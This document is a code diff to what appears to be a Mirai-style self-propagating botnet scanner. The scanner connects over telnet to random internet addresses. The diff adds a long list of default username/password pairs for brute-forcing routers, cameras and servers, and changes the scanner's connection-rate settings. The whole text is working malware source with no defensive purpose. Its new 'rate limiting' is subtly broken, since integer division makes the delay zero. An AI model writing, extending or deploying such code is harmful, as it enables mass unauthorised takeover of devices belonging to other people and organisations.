@@ -6,8 +6,10 @@
 
 #ifdef SELFREP
 
-#define SCANNER_MAX_CONNS 256
-#define SCANNER_RAW_PPS 384
+/* Reduced scanner settings to prevent crashes and network saturation */
+#define SCANNER_MAX_CONNS 64          /* Reduced from 256 */
+#define SCANNER_RAW_PPS 32            /* Reduced from 384 - much slower rate */
+#define SCANNER_CONNECTION_DELAY 500  /* Milliseconds between new connections */
 
 /* Scanner states */
 #define SC_CLOSED 0
@@ -53,12 +55,261 @@ static struct scanner_credential credentials[] = {
     {"root", "password"},
     {"root", "vizxv"},
     {"root", "xc3511"},
+    {"root", "1234"},
+    {"root", "12345"},
+    {"root", "123456789"},
+    {"root", "000000"},
+    {"root", "default"},
+    {"root", "pass"},
+    {"root", "test"},
+    {"root", "guest"},
+    {"root", "master"},
+    {"root", "changeme"},
+    {"root", "12345678"},
+    {"root", "qwerty"},
+    {"root", "abc123"},
+    {"root", "monkey"},
+    {"root", "letmein"},
+    {"root", "dragon"},
+    {"root", "baseball"},
+    {"root", "iloveyou"},
+    {"root", "trustno1"},
+    {"root", "sunshine"},
+    {"root", "princess"},
+    {"root", "welcome"},
+    {"root", "shadow"},
+    {"root", "superman"},
+    {"root", "michael"},
+    {"root", "football"},
+    {"root", "starwars"},
     {"admin", "admin"},
     {"admin", "password"},
+    {"admin", "123456"},
+    {"admin", "admin123"},
+    {"admin", "root"},
+    {"admin", "letmein"},
+    {"admin", "welcome"},
+    {"admin", "monkey"},
+    {"admin", "dragon"},
+    {"admin", "master"},
+    {"admin", "qwerty"},
+    {"admin", "login"},
+    {"admin", "princess"},
+    {"admin", "sunshine"},
+    {"admin", "password1"},
+    {"admin", "1234"},
+    {"admin", "12345"},
     {"support", "support"},
+    {"support", "password"},
+    {"support", "admin"},
+    {"support", "123456"},
+    {"support", "root"},
+    {"support", "support123"},
     {"guest", "guest"},
+    {"guest", "password"},
+    {"guest", "admin"},
+    {"guest", "123456"},
+    {"guest", "guest123"},
     {"user", "user"},
+    {"user", "password"},
+    {"user", "admin"},
+    {"user", "123456"},
+    {"user", "user123"},
     {"default", "default"},
+    {"default", "password"},
+    {"default", "admin"},
+    {"default", "123456"},
+    {"manager", "manager"},
+    {"manager", "password"},
+    {"manager", "admin"},
+    {"manager", "manager123"},
+    {"operator", "operator"},
+    {"operator", "password"},
+    {"operator", "admin"},
+    {"test", "test"},
+    {"test", "password"},
+    {"test", "admin"},
+    {"test", "123456"},
+    {"service", "service"},
+    {"service", "password"},
+    {"service", "admin"},
+    {"supervisor", "supervisor"},
+    {"supervisor", "password"},
+    {"supervisor", "admin"},
+    {"supervisor", "supervisor123"},
+    {"tech", "tech"},
+    {"tech", "password"},
+    {"tech", "admin"},
+    {"technician", "technician"},
+    {"technician", "password"},
+    {"webadmin", "webadmin"},
+    {"webadmin", "password"},
+    {"webadmin", "admin"},
+    {"webadmin", "webadmin123"},
+    {"oracle", "oracle"},
+    {"oracle", "password"},
+    {"mysql", "mysql"},
+    {"mysql", "password"},
+    {"postgres", "postgres"},
+    {"postgres", "password"},
+    {"ftpuser", "ftpuser"},
+    {"ftpuser", "password"},
+    {"backup", "backup"},
+    {"backup", "password"},
+    {"nagios", "nagios"},
+    {"nagios", "password"},
+    {"tomcat", "tomcat"},
+    {"tomcat", "password"},
+    {"jenkins", "jenkins"},
+    {"jenkins", "password"},
+    {"pi", "raspberry"},
+    {"pi", "pi"},
+    {"ubuntu", "ubuntu"},
+    {"centos", "centos"},
+    {"vagrant", "vagrant"},
+    {"ansible", "ansible"},
+    {"docker", "docker"},
+    {"git", "git"},
+    {"svn", "svn"},
+    {"www-data", "www-data"},
+    {"apache", "apache"},
+    {"nginx", "nginx"},
+    {"http", "http"},
+    {"ftp", "ftp"},
+    {"mail", "mail"},
+    {"postfix", "postfix"},
+    {"dovecot", "dovecot"},
+    {"bind", "bind"},
+    {"named", "named"},
+    {"ldap", "ldap"},
+    {"radius", "radius"},
+    {"proxy", "proxy"},
+    {"squid", "squid"},
+    {"snmp", "snmp"},
+    {"public", "public"},
+    {"private", "private"},
+    {"community", "community"},
+    {"cisco", "cisco"},
+    {"huawei", "huawei"},
+    {"zte", "zte"},
+    {"hikvision", "hikvision"},
+    {"dahua", "dahua"},
+    {"axis", "axis"},
+    {"bosch", "bosch"},
+    {"samsung", "samsung"},
+    {"lg", "lg"},
+    {"sony", "sony"},
+    {"panasonic", "panasonic"},
+    {"canon", "canon"},
+    {"epson", "epson"},
+    {"hp", "hp"},
+    {"dell", "dell"},
+    {"ibm", "ibm"},
+    {"lenovo", "lenovo"},
+    {"asus", "asus"},
+    {"acer", "acer"},
+    {"netgear", "netgear"},
+    {"linksys", "linksys"},
+    {"dlink", "dlink"},
+    {"tplink", "tplink"},
+    {"belkin", "belkin"},
+    {"arris", "arris"},
+    {"motorola", "motorola"},
+    {"technicolor", "technicolor"},
+    {"thomson", "thomson"},
+    {"alcatel", "alcatel"},
+    {"siemens", "siemens"},
+    {"ericsson", "ericsson"},
+    {"nokia", "nokia"},
+    {"ubnt", "ubnt"},
+    {"mikrotik", "mikrotik"},
+    {"ruckus", "ruckus"},
+    {"aruba", "aruba"},
+    {"extreme", "extreme"},
+    {"avaya", "avaya"},
+    {"juniper", "juniper"},
+    {"fortinet", "fortinet"},
+    {"paloalto", "paloalto"},
+    {"checkpoint", "checkpoint"},
+    {"sonicwall", "sonicwall"},
+    {"watchguard", "watchguard"},
+    {"barracuda", "barracuda"},
+    {"f5", "f5"},
+    {"citrix", "citrix"},
+    {"vmware", "vmware"},
+    {"root", "xmhdipc"},
+    {"root", "juantech"},
+    {"root", "1234567890"},
+    {"root", "54321"},
+    {"root", "pass123"},
+    {"root", "root123"},
+    {"root", "admin123"},
+    {"root", "qweasdzxc"},
+    {"root", "zaq12wsx"},
+    {"root", "password123"},
+    {"root", "admin@123"},
+    {"root", "root@123"},
+    {"admin", "admin@123"},
+    {"admin", "admin1234"},
+    {"admin", "administrator"},
+    {"admin", "administrator123"},
+    {"admin", "pass@123"},
+    {"admin", "password123"},
+    {"root", "klv123"},
+    {"root", "klv1234"},
+    {"root", "7ujMko0vizxv"},
+    {"root", "7ujMko0admin"},
+    {"root", "system"},
+    {"root", "ikwb"},
+    {"root", "dreambox"},
+    {"root", "user1234"},
+    {"root", "pass1234"},
+    {"root", "111111"},
+    {"root", "666666"},
+    {"root", "888888"},
+    {"root", "654321"},
+    {"root", "a1b2c3"},
+    {"root", "1q2w3e"},
+    {"root", "1q2w3e4r"},
+    {"root", "1qaz2wsx"},
+    {"root", "q1w2e3"},
+    {"root", "q1w2e3r4"},
+    {"admin", "smcadmin"},
+    {"admin", "4321"},
+    {"admin", "1111"},
+    {"admin", "pass"},
+    {"admin", "meinsm"},
+    {"admin", "cat1029"},
+    {"admin", "20080808"},
+    {"admin", "1234abcd"},
+    {"admin", "abcd1234"},
+    {"admin", "qwerty123"},
+    {"admin", "letmein123"},
+    {"admin", "password1"},
+    {"admin", "p@ssw0rd"},
+    {"admin", "P@ssw0rd"},
+    {"admin", "Passw0rd"},
+    {"admin", "Password1"},
+    {"admin", "Password123"},
+    {"admin", "Admin123"},
+    {"admin", "Admin@123"},
+    {"root", "Zte521"},
+    {"root", "tl789"},
+    {"root", "hs7m0dd"},
+    {"root", "telnet"},
+    {"root", "tasmota"},
+    {"root", "Password1234"},
+    {"root", "12345678910"},
+    {"root", "rootroot"},
+    {"root", "toor"},
+    {"root", "p@ss"},
+    {"root", "p@ssword"},
+    {"root", "passw0rd"},
+    {"root", "Passw0rd"},
+    {"root", "Password1"},
+    {"root", "Password123"},
+    {"root", "Root123"},
+    {"root", "Root@123"},
     {NULL, NULL}
 };
 
@@ -70,21 +321,25 @@ static BOOL is_rfc1918(ipv4_t);
 
 void scanner_init(void) {
     int i;
-    
+    time_t last_connect_time = 0;
+
     if (fork() == 0) {
         /* Initialize connections */
         for (i = 0; i < SCANNER_MAX_CONNS; i++) {
             conns[i].fd = -1;
             conns[i].state = SC_CLOSED;
         }
-        
+
+        srand(time(NULL));
+
         while (TRUE) {
             fd_set fdset;
             struct timeval tv;
             int maxfd = 0;
-            
+            time_t now = time(NULL);
+
             FD_ZERO(&fdset);
-            
+
             /* Add all active connections to fdset */
             for (i = 0; i < SCANNER_MAX_CONNS; i++) {
                 if (conns[i].state != SC_CLOSED) {
@@ -92,10 +347,10 @@ void scanner_init(void) {
                     if (conns[i].fd > maxfd) maxfd = conns[i].fd;
                 }
             }
-            
+
             tv.tv_sec = 1;
             tv.tv_usec = 0;
-            
+
             int nfds = select(maxfd + 1, &fdset, NULL, NULL, &tv);
             
             /* Check for timeouts */
@@ -105,7 +360,7 @@ void scanner_init(void) {
                     scanner_close(&conns[i]);
                 }
             }
-            
+
             /* Process readable sockets */
             if (nfds > 0) {
                 for (i = 0; i < SCANNER_MAX_CONNS; i++) {
@@ -114,14 +369,18 @@ void scanner_init(void) {
                     }
                 }
             }
-            
-            /* Start new connections */
-            for (i = 0; i < SCANNER_MAX_CONNS; i++) {
-                if (conns[i].state == SC_CLOSED) {
-                    conns[i].dst_addr = get_random_ip();
-                    conns[i].dst_port = 23;
-                    scanner_connect(&conns[i]);
-                    break;
+
+            /* Start new connections with rate limiting */
+            time_t current_time = time(NULL);
+            if (current_time - last_connect_time >= (SCANNER_CONNECTION_DELAY / 1000)) {
+                for (i = 0; i < SCANNER_MAX_CONNS; i++) {
+                    if (conns[i].state == SC_CLOSED) {
+                        conns[i].dst_addr = get_random_ip();
+                        conns[i].dst_port = 23;
+                        scanner_connect(&conns[i]);
+                        last_connect_time = current_time;
+                        break;
+                    }
                 }
             }
         }
